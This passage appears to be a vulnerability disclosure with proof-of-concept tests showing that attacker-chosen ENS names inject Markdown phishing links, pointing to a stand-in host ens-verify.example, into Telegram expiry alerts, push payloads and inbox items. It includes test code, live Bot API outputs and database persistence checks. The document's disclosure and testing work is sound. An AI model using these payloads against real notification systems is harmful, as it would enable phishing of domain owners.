    .some((p) => /\[[^\]]+\]\(https?:\/\/[^)]+\)/.test(p))
}

describe('R51 · notification payload carries attacker-authored text', () => {
  it('P1 addresses the notification to the victim, on ownership alone', () => {
    const ownerToUserId = new Map([[VICTIM_ADDRESS.toLowerCase(), VICTIM_USER_ID]])
    const recipients = collectRecipientsForEvent(
      { name: ATTACK_NAME, expiryDate: Math.floor(EXPIRY / 1000), owner: VICTIM_ADDRESS, includeFavorites: false } as never,
      ownerToUserId, new Map())
    out.p1_recipients = [...recipients.entries()]
    expect([...recipients.entries()]).toEqual([[VICTIM_USER_ID, 'owned']])

    const none = collectRecipientsForEvent(
      { name: ATTACK_NAME, expiryDate: Math.floor(EXPIRY / 1000), owner: VICTIM_ADDRESS, includeFavorites: false } as never,
      new Map(), new Map())
    out.p1_control_unknownOwner = [...none.entries()]
    expect(none.size).toBe(0)
  })

  it('P2 the Telegram message renders an attacker-chosen link', () => {
    const msg = telegramTemplates['name-expiry']({ name: ATTACK_NAME, expiryDate: EXPIRY, isOwner: true } as never)
    out.p2_telegram = { text: msg.text, parseMode: msg.parseMode, buttons: msg.buttons }
    out.p2_codeSpans = codeSpans(msg.text)
    out.p2_linkOutsideCodeSpan = linkOutsideCode(msg.text)
    expect(msg.parseMode).toBe('Markdown')
    expect(linkOutsideCode(msg.text)).toBe(true)
    expect(msg.text).toContain('https://ens-verify.example/claim')

    const benign = telegramTemplates['name-expiry']({ name: BENIGN_NAME, expiryDate: EXPIRY, isOwner: true } as never)
    out.p2_control_benign = { text: benign.text, linkOutsideCodeSpan: linkOutsideCode(benign.text) }
    expect(linkOutsideCode(benign.text)).toBe(false)
    // NOT a control: our own helper against a fixed string; no production change can fail it
    expect(linkOutsideCode('see [x](https://example.com) here')).toBe(true)
  })

  it('P3 the push payload carries the raw label in every field', () => {
    const push = pushTemplates['name-expiry']({ name: ATTACK_NAME, expiryDate: EXPIRY, isOwner: true } as never)
    out.p3_push = push
    expect(push.body).toContain(ATTACK_LABEL)
    expect(push.tag).toContain(ATTACK_LABEL)
    expect(String(push.data?.url)).toContain(ATTACK_LABEL)
    const benign = pushTemplates['name-expiry']({ name: BENIGN_NAME, expiryDate: EXPIRY, isOwner: true } as never)
    out.p3_control_benign = benign
    expect(benign.body).not.toContain(ATTACK_LABEL)
  })

  it('the artefact on disk carries the attacker-controlled link', () => {
    writeFileSync('./out-r51-notification.json', JSON.stringify(out, null, 2))
    const onDisk = JSON.parse(readFileSync('./out-r51-notification.json', 'utf8'))
    expect(onDisk.p2_linkOutsideCodeSpan).toBe(true)
    expect(onDisk.p2_control_benign.linkOutsideCodeSpan).toBe(false)
  })
})
```

Output (`out-r51-notification.json`, verbatim):

```json
{
  "attackLabel": "a`[Renew now](https://ens-verify.example/claim)`b",
  "attackName": "a`[Renew now](https://ens-verify.example/claim)`b.eth",
  "p1_recipients": [
    [
      "victim-user-id",
      "owned"
    ]
  ],
  "p1_control_unknownOwner": [],
  "p2_telegram": {
    "text": "⚠️ *Domain Expiration Alert*\n\nYour domain `a`[Renew now](https://ens-verify.example/claim)`b.eth` will expire in *28 days*.\n\nDon't forget to renew your domain!",
    "parseMode": "Markdown",
    "buttons": [
      [
        {
          "text": "🔄 Renew Now",
          "url": "https://app.ens.domains/a`[Renew now](https://ens-verify.example/claim)`b.eth"
        }
      ]
    ]
  },
  "p2_codeSpans": 2,
  "p2_linkOutsideCodeSpan": true,
  "p2_control_benign": {
    "text": "⚠️ *Domain Expiration Alert*\n\nYour domain `alice.eth` will expire in *28 days*.\n\nDon't forget to renew your domain!",
    "linkOutsideCodeSpan": false
  },
  "p3_push": {
    "title": "ENS Name Expiring Soon",
    "body": "a`[Renew now](https://ens-verify.example/claim)`b.eth expires in 28 days",
    "tag": "expiry-a`[Renew now](https://ens-verify.example/claim)`b.eth",
    "data": {
      "url": "https://app.ens.domains/a`[Renew now](https://ens-verify.example/claim)`b.eth",
      "name": "a`[Renew now](https://ens-verify.example/claim)`b.eth",
      "expiryDate": 1791309916137
    }
  },
  "p3_control_benign": {
    "title": "ENS Name Expiring Soon",
    "body": "alice.eth expires in 28 days",
    "tag": "expiry-alice.eth",
    "data": {
      "url": "https://app.ens.domains/alice.eth",
      "name": "alice.eth",
      "expiryDate": 1791309916137
    }
  }
}
```

***

### Part 4 — what the victim sees in the Manager inbox (4 passed)

Copy into `apps/manager/src/features/notifications/inbox/` and run:

```bash
pnpm exec vitest run --reporter=verbose src/features/notifications/inbox/poc-r51-inbox-render.test.tsx
# Test Files  1 passed (1)
#      Tests  4 passed (4)
```

Log: `out/out-vitest-manager.txt`. Artefact: `out/out-r51-inbox-render.json`.

```tsx
/**
 * R51 leg S — the in-app half: what a victim actually sees in the Manager inbox
 * when an attacker-authored name is placed in their account.
 *
 * Renders the REAL `NotificationItem` (apps/manager/src/features/notifications/
 * inbox/notification-item.tsx) with the payload the worker would store, using the
 * project's own test harness — the file is a copy of the shape of the project's
 * own notification-item.test.tsx, with only the payload changed.
 *
 * RUN: copy into apps/manager/src/features/notifications/inbox/ and
 *      `pnpm exec vitest run src/features/notifications/inbox/poc-r51-inbox-render.test.tsx`
 * Output: out-r51-inbox-render.json next to the manager package root.
 */
import { readFileSync, writeFileSync } from 'node:fs'
import type { AnchorHTMLAttributes } from 'react'
import { describe, expect, it, vi } from 'vitest'
import { render } from '@/utils/test-utils'
import { NotificationItem } from './notification-item'

vi.mock('@tanstack/react-router', () => ({
  Link: ({ children, ...props }: AnchorHTMLAttributes<HTMLAnchorElement>) => (
    <a {...props}>{children}</a>
  ),
}))

// A label that ENSIP-15 normalises unchanged (lowercase ASCII + hyphens), so this
// half needs no non-normalized trick at all — it is registrable by anyone.
const SENTENCE_NAME =
  'ens-support-your-names-will-be-deleted-verify-at-ens-verify-example.eth'
// The label measured as registrable on live Sepolia (r51probe`x.eth carries U+0060).
const BREAKOUT_NAME = 'a`[Renew now](https://ens-verify.example/claim)`b.eth'
const BENIGN_NAME = 'alice.eth'

const notification = (name: string) => ({
  id: '1',
  kind: 'name-expiry' as const,
  payload: {
    name,
    expiryDate: Date.now() + 28 * 24 * 3600 * 1000,
    isOwner: true,
    watchReason: 'owned' as const,
  },
  source: 'personal' as const,
  seen: false,
  timestamp: Date.now(),
})

const out: Record<string, unknown> = {}

describe('R51 · the victim’s inbox renders attacker-authored text', () => {
  it('S1 renders a full attacker-written sentence as the notification’s name', () => {
    const { container, getByText } = render(
      <NotificationItem notification={notification(SENTENCE_NAME)} />,
    )
    out.s1_name = SENTENCE_NAME
    out.s1_textContent = container.textContent
    out.s1_html = container.innerHTML
    // Recorded, but NOT offered as a sensitivity control: this harness stubs the router's
    // Link, so the anchor this card renders carries no href at all. Nothing in this test
    // can produce an href, so the href-selector below has no positive case here and we do
    // not claim one. What evidences the escaping is in S2: the markdown appears as literal
    // text and the card emits no anchor element whatsoever.
    out.s1_anchorCountInThisCard = container.querySelectorAll('a').length
    out.s1_anchorsWithHref = container.querySelectorAll('a[href]').length
    expect(getByText(SENTENCE_NAME)).toBeInTheDocument()
  })

  it('S2 renders the non-normalized (backtick) name verbatim too', () => {
    const { container, getByText } = render(
      <NotificationItem notification={notification(BREAKOUT_NAME)} />,
    )
    out.s2_name = BREAKOUT_NAME
    out.s2_textContent = container.textContent
    out.s2_html = container.innerHTML
    expect(getByText(BREAKOUT_NAME)).toBeInTheDocument()
    // React escapes: the injected markup must NOT have become an element.
    // Record the measurement BEFORE asserting on it, so the artefact carries a reading
    // rather than a constant written on the success path.
    out.s2_becameAnAnchor =
      container.querySelector('a[href*="ens-verify.example"]') !== null
    out.s2_anchorCountInThisCard = container.querySelectorAll('a').length
    // The load-bearing readings: the markdown is present as literal text, and the card
    // emitted no anchor element at all. Neither depends on the href selector.
    out.s2_markdownPresentAsLiteralText =
      (container.textContent ?? '').includes('[Renew now](https://ens-verify.example/claim)')
    expect(out.s2_markdownPresentAsLiteralText).toBe(true)
    expect(out.s2_anchorCountInThisCard).toBe(0)
    expect(out.s2_becameAnAnchor).toBe(false)
  })

  it('S3 control: a benign name renders benignly', () => {
    const { container, getByText } = render(
      <NotificationItem notification={notification(BENIGN_NAME)} />,
    )
    out.s3_textContent = container.textContent
    expect(getByText(BENIGN_NAME)).toBeInTheDocument()
    // On its own this cannot fail (the benign label never contained that string). It is
    // the PAIR S2/S3 that discriminates: the same detector fires for S2 and not here.
    expect(container.textContent).not.toContain('ens-verify.example')
  })

  it('the artefact on disk carries the rendered attacker text', () => {
    writeFileSync('./out-r51-inbox-render.json', JSON.stringify(out, null, 2))
    // Not an empty assertion: re-read from disk, so what a reviewer opens is what is asserted.
    const onDisk = JSON.parse(readFileSync('./out-r51-inbox-render.json', 'utf8'))
    expect(onDisk.s2_textContent).toContain('ens-verify.example')
    expect(onDisk.s3_textContent).not.toContain('ens-verify.example')
  })
})
```

Rendered card text — the `textContent` fields of `out-r51-inbox-render.json`, verbatim (the card puts no whitespace between these spans, so the strings run together):

```
s1_textContent  ExpiryJust nowExpires in 27 daysens-support-your-names-will-be-deleted-verify-at-ens-verify-example.ethThis name is expiring soon and should be renewed as soon as possible.Renew Now

s2_textContent  ExpiryJust nowExpires in 27 daysa`[Renew now](https://ens-verify.example/claim)`b.ethThis name can't be renewed in Manager.

s3_textContent  ExpiryJust nowExpires in 27 daysalice.ethThis name is expiring soon and should be renewed as soon as possible.Renew Now
```

S1's label is plain lowercase ASCII with hyphens. We ran **that exact string** through `@adraffy/ens-normalize` 1.11.1 — case `s1-inbox-label-exact` in `out-h-normalized-markdown.json` — and it is accepted unchanged. So the in-app half needs nothing unusual on-chain at all: it works with a fully normalised name. (The same file records that S2's markup label and part 1's spaced sentence are **rejected** by the normaliser; neither passes through it in this pipeline, and we do not claim otherwise.)

***

### Part 5 — Telegram's Bot API, asked directly (live)

Sent through **our own throwaway bot, to our own chat**. ENS's bot was not used and no third party received anything.

The message text is not typed by hand anywhere in this leg. `poc-r51-telegram-payloads.test.ts` calls the production `telegramTemplates['name-expiry']` and writes its output to `out-r51-telegram-payloads.json`; `telegram-probe.mjs` then POSTs that file verbatim. (An earlier version of this probe hand-copied the template's text and the copy had drifted from it — dropping the leading warning sign, the bold heading and the apostrophe in "Don't". Everything below is a fresh run of the real template's bytes.)

```bash
pnpm exec vitest run --config vitest.poc.config.ts src/poc-r51-telegram-payloads.test.ts
node telegram-probe.mjs      # reads the bot token from a local gitignored file, never prints it
```

Four cases. Payload generation is logged in `out/out-vitest-telegram-payloads.txt`; the raw exchange below is `out/out-telegram-probe.txt`. Telegram's own responses, with the bot token, chat id and the tester's identity redacted by the script; the `ok` flags, error codes and `entities` are untouched:

```
=== T1  label a`[Renew now](https://ens-verify.example/claim)`b.eth , WITH the inline keyboard
{"ok":true, "text":"⚠️ Domain Expiration Alert

Your domain aRenew nowb.eth will expire in 28 days.

Don't forget to renew your domain!",
 "entities":[{"offset":3,"length":23,"type":"bold"},
             {"offset":40,"length":1,"type":"code"},
             {"offset":41,"length":9,"type":"text_link","url":"https://ens-verify.example/claim"},
             {"offset":50,"length":5,"type":"code"},
             {"offset":71,"length":7,"type":"bold"}],
 "link_preview_options":{"url":"https://ens-verify.example/claim"},
 "reply_markup":{"inline_keyboard":[[{"text":"🔄 Renew Now",
   "url":"https://app.ens.domains/a`[Renew%20now](https://ens-verify.example/claim)`b.eth"}]]}}

=== T2  same label, NO keyboard  -> isolates the button URL
{"ok":true, ... identical text and identical entities, including
             {"offset":41,"length":9,"type":"text_link","url":"https://ens-verify.example/claim"} ...}

=== T3  label r51probe`x.eth  (odd backtick count)
{"ok":false,"error_code":400,
 "description":"Bad Request: can't parse entities: Can't find end of the entity starting at byte offset 61"}

=== T4  control, label alice.eth
{"ok":true, "text":"⚠️ Domain Expiration Alert

Your domain alice.eth will expire in 28 days.

Don't forget to renew your domain!",
 "entities":[{"offset":3,"length":23,"type":"bold"},
             {"offset":40,"length":9,"type":"code"},
             {"offset":65,"length":7,"type":"bold"}]}
```

What each case settles:

* **T1** — accepted, and Telegram itself reports a `text_link` entity pointing at the attacker's URL. The visible text collapses to `aRenew nowb.eth`: the markdown was consumed, not displayed. Telegram also attaches a **link preview for the attacker's domain**.
* **T1 vs T2** — the link does not depend on the keyboard, and the keyboard does not break the send: Telegram accepted the button URL built from the raw label, percent-encoding the space. Our own leading objection to this report — that `BUTTON_URL_INVALID` would kill the whole message — is refuted by measurement.
* **T3** — a single backtick leaves the message's backtick count odd and the send is rejected. That is a delivery failure, not an injection, and we describe it as such.
* **T4 (control)** — the same template with a benign label yields `bold` (the heading), one `code` spanning the whole name, and `bold` (the day count). **No `text_link`, and the name stays inside a single code span.** Compare T1, where the same template splits that one `code` into two and inserts the attacker's link between them. The entity list is what changes, and only the label changed.

***

### Part 6 — the discovery stage itself, run (3 passed)

The first version of this report said the `expiry-discovery` stage was read rather than executed. It is executed here. What is replaced is the `indexer.js` module (so `fetchExpiringNamesPage` returns a fixed page instead of making an HTTP call) plus the KV and queue bindings, using the same shapes the project's own `src/services/expiry-discovery/index.test.ts` uses. `runExpiryDiscoveryCron`, its stage loop, its cursor handling and its event construction are the real code.

**What this part therefore does not cover**: because the whole `indexer.js` module is replaced, the response-mapping at `indexer.ts:134-142` is not exercised here. That the indexer relays a raw label into the `name` field is established separately, against live Sepolia, in part 2. Part 6 covers everything downstream of `fetchExpiringNamesPage`'s return value.

Copy into `workers/api-worker/src/` and run:

```bash
pnpm exec vitest run --reporter=verbose --config vitest.poc.config.ts src/poc-r51-expiry-discovery-cron.test.ts
# ✓ V1 the enqueued event carries the label byte-for-byte
# ✓ V2 sensitivity: change the label at the boundary and the queue changes with it
# ✓ V3 the artefact on disk carries the relayed label
# Tests  3 passed (3)
```

Output (`out-r51-cron.json`, verbatim):

```json
{
  "attackLabel": "a`[Renew now](https://ens-verify.example/claim)`b",
  "attackName": "a`[Renew now](https://ens-verify.example/claim)`b.eth",
  "v1_enqueuedNames": [
    "a`[Renew now](https://ens-verify.example/claim)`b.eth",
    "alice.eth"
  ],
  "v1_enqueuedCount": 2,
  "v1_attackEvent": {
    "type": "name_expiring",
    "name": "a`[Renew now](https://ens-verify.example/claim)`b.eth",
    "expiryDate": 1788825700,
    "stage": "30d",
    "owner": "0x8a218F9C5F0b8854213225DA4D62628D4C92BEF4",
    "includeFavorites": false
  },
  "v1_byteForByte": true,
  "v1_neverSuppliedName_vacuousCheck": false,
  "v2_sensitivityNames": [
    "a-different-label.eth"
  ]
}
```

What each reading settles:

* **V1** — the label supplied at the stubbed boundary arrives in the event-ingestion queue **byte-for-byte**, inside the `name` field the ingestion consumer reads. A benign name on the same page is relayed alongside it, so the stage ran rather than short-circuiting.
* **V2** — change the label at the boundary and the queue changes with it: the instrument is not printing a constant.
* **V3** — the artefact is re-read from disk and asserted against, so what a reviewer opens is what was checked.
* **`v1_neverSuppliedName_vacuousCheck` is not a control and we do not treat it as one.** The stub is the only source of names, so "a name we never supplied does not appear" cannot fail whatever the code does. It is recorded and labelled vacuous rather than quietly presented as evidence.

The event object the cron builds (`v1_attackEvent`, six fields) is a **superset** of the four-field object part 3 constructs by hand and casts with `as never` — it adds `type` and `stage`. So part 6 does not prove part 3's input was byte-identical; it proves the fields part 3 relies on (`name`, `expiryDate`, `owner`, `includeFavorites`) are the ones the cron actually produces, with the label intact.

What is still not executed: the database insert at `event-ingestion.ts:249-262`, and the archive/read behaviour in `app/routes/notifications/index.ts`. Both are read from source; we did not stand up a Postgres instance. Script and log: `poc-r51-expiry-discovery-cron.test.ts`, `out/out-vitest-cron.txt` (the log names the file and each case).

***

### Part 7 — the row is really written, and archiving really does not remove it (4 passed)

Section 5 of the Vulnerability Details used to be read from source. It is executed here against a real PostgreSQL engine — PGlite, Postgres compiled to WebAssembly — created from **the repository's own migrations** in `workers/api-worker/drizzle/`.

What is substituted, and only this: the database **transport** (`getDatabase` returns a drizzle client bound to PGlite instead of `neon-http`) and the route's auth middleware, so a request can carry a user id without a session. The schema, the drizzle query builders, the SQL they emit, the ingestion consumer `handleEventIngestionQueue` and the route handlers are the production code, unmodified.

```bash
pnpm exec vitest run --reporter=verbose --config vitest.poc.config.ts src/poc-r51-db-persistence.test.ts
# ✓ W1 the production ingestion consumer writes a row carrying the attacker text
# ✓ W3 the listing returns the row, archiving succeeds, and the listing still returns it
# ✓ W4 control: the listing DOES drop the row when it is really gone
# ✓ W2 writes the artefact
# Tests  4 passed (4)
```

Output (`out-r51-db.json`, verbatim):

```json
{
  "attackName": "a`[Renew now](https://ens-verify.example/claim)`b.eth",
  "w1_victimUserId": "01a0821e-71de-70d4-b595-834de61337d4",
  "w1_rowCount": 1,
  "w1_row": {
    "kind": "name-expiry",
    "payload": {
      "name": "a`[Renew now](https://ens-verify.example/claim)`b.eth",
      "isOwner": true,
      "expiryDate": 1791308628000,
      "watchReason": "owned"
    },
    "archived_at": null
  },
  "w3_listBefore_status": 200,
  "w3_listBefore_count": 1,
  "w3_listBefore_name": "a`[Renew now](https://ens-verify.example/claim)`b.eth",
  "w3_archive_status": 200,
  "w3_archivedAtAfterArchive": "set",
  "w3_listAfterArchive_count": 1,
  "w3_listAfterArchive_name": "a`[Renew now](https://ens-verify.example/claim)`b.eth",
  "w4_control_listAfterRealDelete_count": 0
}
```

What each reading settles:

* **W1** — the real queue consumer inserts one row, and its stored `payload.name` is the attacker's string byte-for-byte. The insert is no longer an inference. The run log also shows the consumer reporting `insertedNotifications: 1` alongside `suppressedBySettingsCount: 1`: **the row is written even though every external delivery is suppressed** — in this run the victim has no settings row at all, so `event-ingestion.ts:342-343` falls back to `false`. That is the ordering claimed in section 3, now observed rather than read.
* **W3** — `GET /notifications` returns the row with the attacker text (`200`, one item). `PATCH /notifications/archive` returns `200` and the `archived_at` column really is set. **The same listing then returns the same row again.** Archiving is accepted, recorded, and has no effect on what the inbox reads.
* **W4 (control)** — delete the row outright and the same listing returns **zero**. Without this, W3's readings would carry no information: this is what shows the instrument can register a disappearance.

Environment note, stated rather than buried: PGlite has no `pg_uuidv7` extension, so the migration's `CREATE EXTENSION` line is dropped and a compatible `uuid_generate_v7()` is defined in SQL. Nothing above depends on the id being genuinely time-ordered — cursor pagination is not exercised.

Script and log: `poc-r51-db-persistence.test.ts`, `out/out-vitest-db.txt`.
